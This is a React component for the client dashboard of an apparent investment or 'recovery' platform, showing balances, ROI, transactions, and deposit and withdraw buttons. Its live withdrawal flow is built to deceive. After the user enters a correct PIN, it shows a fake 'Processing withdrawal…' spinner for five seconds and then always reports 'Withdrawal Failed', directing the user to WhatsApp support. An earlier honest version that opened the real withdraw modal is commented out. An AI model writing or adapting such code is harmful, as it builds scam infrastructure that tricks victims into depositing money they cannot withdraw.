import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import api from "../api/axios.js";
import { useAuth } from "../context/AuthContext.jsx";
import BalanceCard from "../components/BalanceCard.jsx";
import WithdrawModal from "./Withdrawmodal.jsx";
import DepositModal from "./DepositModal.jsx";

const ClientDashboard = () => {
  const { user, logout } = useAuth();
  const navigate = useNavigate();
  const [data, setData] = useState(null);
  const [toast, setToast] = useState("");
  const [showPinModal, setShowPinModal] = useState(false);
  const [pinInput, setPinInput] = useState("");
  const [pinError, setPinError] = useState("");
  const [openDeposit, setOpenDeposit] = useState(false);
  const [withdrawModalOpen, setWithdrawModalOpen] = useState(false);
  const [verifying, setVerifying] = useState(false);

  const [withdrawalFailed, setWithdrawalFailed] = useState(false);
  

  useEffect(() => {
    api.get("/user/dashboard").then((res) => setData(res.data));
  }, []);

  const showToast = (msg) => {
    setToast(msg);
    setTimeout(() => setToast(""), 3000);
  };

  const openWithdrawModal = () => {
    setPinInput("");
    setPinError("");
    setShowPinModal(true);
    
  };

  const openDepositModal = () => {
    setOpenDeposit(true);
  };

  // const submitPin = async (e) => {
  //   e.preventDefault();
  //   setPinError("");
  //   setVerifying(true);
  //   try {
  //     await api.post("/user/verify-pin", { pin: pinInput });
  //     setShowPinModal(false);
  //     showToast("PIN confirmed");
  //     setWithdrawModalOpen(true);
  //   } catch (err) {
  //     setPinError(err?.response?.data?.message || "Incorrect PIN.");
  //   } finally {
  //     setVerifying(false);
  //   }
  // };

  const submitPin = async (e) => {
  e.preventDefault();
  setPinError("");
  setVerifying(true);

  try {
    await api.post("/user/verify-pin", { pin: pinInput });

    // Keep verifying = true during the 5 second delay
    setTimeout(() => {
      setVerifying(false);
      setWithdrawalFailed(true);
    }, 5000);

  } catch (err) {
    setVerifying(false); // Reset immediately on error
    setPinError(err?.response?.data?.message || "Incorrect PIN.");
  }
};

  if (!data) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-canvas">
        <span className="font-mono text-sm text-slate-muted">Loading…</span>
      </div>
    );
  }

  const d = data.dashboard;

  return (
    <div className="min-h-screen bg-canvas">
      <header className="border-b border-black/5 bg-panel">
        <div className="max-w-3xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="font-display text-lg font-semibold text-ink">Ref/recovery</div>
          <div className="flex items-center gap-4">
            <span className="text-sm text-slate-muted hidden sm:inline">{data.name}</span>
            <button
              onClick={() => {
                logout();
                navigate("/login");
              }}
              className="focus-ring text-sm font-medium text-ink/70 hover:text-ink"
            >
              Sign out
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-3xl mx-auto px-6 py-10 space-y-6">
        <div>
          <h1 className="font-display text-2xl font-semibold text-ink">{d.headline}</h1>
          {d.message && <p className="text-sm text-slate-muted mt-2">{d.message}</p>}
          {data.phone && (
            <p className="text-sm text-slate-muted mt-2">
              <span className="text-xs uppercase tracking-wide text-slate-muted/80 mr-1">
                Registered phone:
              </span>
              {data.phone}
            </p>
          )}
        </div>

        <BalanceCard
          mainBalance={d.mainBalance}
          withdrawableBalance={d.withdrawableBalance}
          currency={d.currency}
          planName={d.planName}
          roiPercent={d.roiPercent}
          seed={data.name.length}
        />

        {(d.showDeposit || d.showWithdraw) && (
          <div className="flex gap-3">
            {d.showDeposit && (
              <button
                onClick={openDepositModal}
                className="focus-ring flex-1 rounded-lg bg-teal px-4 py-3 text-sm font-semibold text-white hover:bg-teal-dark transition"
              >
                Deposit
              </button>
            )}
            {d.showWithdraw && (
              <button
                onClick={openWithdrawModal}
                className="focus-ring flex-1 rounded-lg border border-black/10 bg-panel px-4 py-3 text-sm font-semibold text-ink hover:bg-canvas transition"
              >
                Withdraw
              </button>
            )}
          </div>
        )}

        {d.transactions?.length > 0 && (
          <div className="rounded-2xl border border-black/5 bg-panel p-6">
            <h2 className="font-display text-base font-semibold text-ink mb-4">
              Transaction history
            </h2>
            <div className="divide-y divide-black/5">
              {[...d.transactions]
                .sort((a, b) => new Date(b.date) - new Date(a.date))
                .map((tx) => {
                  const isCredit = tx.type === "deposit" || tx.type === "profit";
                  const typeLabel = {
                    deposit: "Deposit",
                    withdrawal: "Withdrawal",
                    profit: "Profit credit",
                    fee: "Fee",
                    adjustment: "Adjustment",
                  }[tx.type];
                  const statusStyle = {
                    completed: "bg-teal-light text-teal-dark",
                    pending: "bg-gold-light text-gold",
                    failed: "bg-red-50 text-red-600",
                  }[tx.status];

                  return (
                    <div key={tx._id} className="flex items-center justify-between py-3 gap-4">
                      <div className="min-w-0">
                        <p className="text-sm font-medium text-ink">{typeLabel}</p>
                        <p className="text-xs text-slate-muted mt-0.5">
                          {new Date(tx.date).toLocaleDateString(undefined, {
                            year: "numeric",
                            month: "short",
                            day: "numeric",
                          })}
                          {tx.note ? ` · ${tx.note}` : ""}
                        </p>
                      </div>
                      <div className="flex items-center gap-3 shrink-0">
                        <span
                          className={`hidden sm:inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium capitalize ${statusStyle}`}
                        >
                          {tx.status}
                        </span>
                        <span
                          className={`font-mono text-sm font-semibold ${
                            isCredit ? "text-teal-dark" : "text-ink"
                          }`}
                        >
                          {isCredit ? "+" : "−"}
                          {new Intl.NumberFormat("en-US", {
                            style: "currency",
                            currency: d.currency,
                          }).format(tx.amount)}
                        </span>
                      </div>
                    </div>
                  );
                })}
            </div>
          </div>
        )}

        {d.customFields?.length > 0 && (
          <div className="rounded-2xl border border-black/5 bg-panel p-6">
            <h2 className="font-display text-base font-semibold text-ink mb-4">Details</h2>
            <dl className="grid sm:grid-cols-2 gap-4">
              {d.customFields.map((f, idx) => (
                <div key={idx}>
                  <dt className="text-xs uppercase tracking-wide text-slate-muted">{f.label}</dt>
                  <dd className="text-sm text-ink mt-0.5">{f.value}</dd>
                </div>
              ))}
            </dl>
          </div>
        )}

      </main>

      {/* {showPinModal && (
        <div className="fixed inset-0 bg-ink/40 flex items-center justify-center p-4 z-50">
          <div className="w-full max-w-xs rounded-2xl bg-panel p-6">
            <h2 className="font-display text-lg font-semibold text-ink">Enter your PIN</h2>
            <p className="text-sm text-slate-muted mt-1">
              Confirm your 4-digit transaction PIN to continue.
            </p>
            <form onSubmit={submitPin} className="mt-5 space-y-4">
              <input
                autoFocus
                inputMode="numeric"
                value={pinInput}
                onChange={(e) => setPinInput(e.target.value.replace(/\D/g, "").slice(0, 4))}
                className="focus-ring w-full text-center tracking-[0.5em] rounded-lg border border-black/10 px-3 py-3 text-lg font-mono"
                placeholder="••••"
              />
              {pinError && <p className="text-sm text-red-600">{pinError}</p>}
              <div className="flex justify-end gap-3">
                <button
                  type="button"
                  onClick={() => setShowPinModal(false)}
                  className="focus-ring text-sm font-medium text-ink/70 hover:text-ink px-4 py-2.5"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={verifying || pinInput.length !== 4}
                  className="focus-ring rounded-lg bg-teal px-4 py-2.5 text-sm font-semibold text-white hover:bg-teal-dark disabled:opacity-60"
                >
                  {verifying ? "Checking…" : "Confirm"}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}  */}

      {showPinModal && (
  <div className="fixed inset-0 bg-ink/40 flex items-center justify-center p-4 z-50">
    <div className="w-full max-w-xs rounded-2xl bg-panel p-6">
      
      {/* 1. INITIAL FORM STATE */}
      {!verifying && !withdrawalFailed && (
        <>
          <h2 className="font-display text-lg font-semibold text-ink">Enter your PIN</h2>
          <p className="text-sm text-slate-muted mt-1">
            Confirm your 4-digit transaction PIN to continue.
          </p>
          <form onSubmit={submitPin} className="mt-5 space-y-4">
            <input
              autoFocus
              inputMode="numeric"
              type="password"
              value={pinInput}
              onChange={(e) => setPinInput(e.target.value.replace(/\D/g, "").slice(0, 4))}
              className="focus-ring w-full text-center tracking-[0.5em] rounded-lg border border-black/10 px-3 py-3 text-lg font-mono"
              placeholder="••••"
            />
            {pinError && <p className="text-sm text-red-600">{pinError}</p>}
            <div className="flex justify-end gap-3">
              <button
                type="button"
                onClick={() => setShowPinModal(false)}
                className="focus-ring text-sm font-medium text-ink/70 hover:text-ink px-4 py-2.5"
              >
                Cancel
              </button>
              <button
                type="submit"
                disabled={pinInput.length !== 4}
                className="focus-ring rounded-lg bg-teal px-4 py-2.5 text-sm font-semibold text-white hover:bg-teal-dark disabled:opacity-60"
              >
                Confirm
              </button>
            </div>
          </form>
        </>
      )}

      {/* 2. LOADING STATE (5 Seconds) */}
      {verifying && (
        <div className="py-8 flex flex-col items-center justify-center text-center space-y-3">
          <svg className="animate-spin h-8 w-8 text-teal" viewBox="0 0 24 24" fill="none">
            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
          </svg>
          <p className="text-sm font-medium text-ink">Processing withdrawal…</p>
        </div>
      )}

      {/* 3. FAILURE STATE */}
      {withdrawalFailed && (
        <div className="py-2 text-center space-y-4">
          <div className="w-12 h-12 rounded-full bg-red-100 text-red-600 flex items-center justify-center mx-auto text-xl font-bold">
            ✕
          </div>
          <div>
            <h2 className="font-display text-lg font-semibold text-ink">Withdrawal Failed</h2>
            <p className="text-sm text-slate-muted mt-1">
              We couldn't complete your transaction. Please reach out to our team to resolve this.
            </p>
          </div>
          <div className="pt-2 space-y-2">
            {/* Clean support phone number by stripping everything except numbers */}
{(() => {
  const cleanPhone = d?.supportPhone?.replace(/\D/g, "") || "1234567890"; // Replace fallback
  return (
    <a
      href={`https://wa.me/${cleanPhone}?text=Hi,%20my%20withdrawal%20failed.`}
      target="_blank"
      rel="noopener noreferrer"
      className="block w-full text-center rounded-lg bg-emerald-600 px-4 py-2.5 text-sm font-semibold text-white hover:bg-emerald-700"
    >
      Contact Support on WhatsApp
    </a>
  );
})()}
            <button
              type="button"
              onClick={() => {
                setShowPinModal(false);
                setWithdrawalFailed(false);
                setPinInput("");
              }}
              className="w-full text-sm font-medium text-ink/70 hover:text-ink py-2"
            >
              Close
            </button>
          </div>
        </div>
      )}

    </div>
  </div>
)}

      {toast && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 rounded-lg bg-ink text-white text-sm px-4 py-2.5 shadow-lg">
          {toast}
        </div>
      )}

      <WithdrawModal
      open={withdrawModalOpen}
      onClose={() => setWithdrawModalOpen(false)}
      mainBalance={d.mainBalance}
      balance={d.withdrawableBalance}
      withdrawMessage={d.withdrawalMessage}
      onSubmit={(amount) => {
        setWithdrawModalOpen(false);
      }}
      supportUrl={`https://wa.me/${d.supportPhone}`}
      />

      <DepositModal
      open={openDeposit}
      onClose={() => setOpenDeposit(false)}
      onSubmit={(amount) => {
        setOpenDeposit(false);
      }}
      supportUrl={`https://wa.me/${d.supportPhone}`}
      />
    </div>
  );
};

export default ClientDashboard;
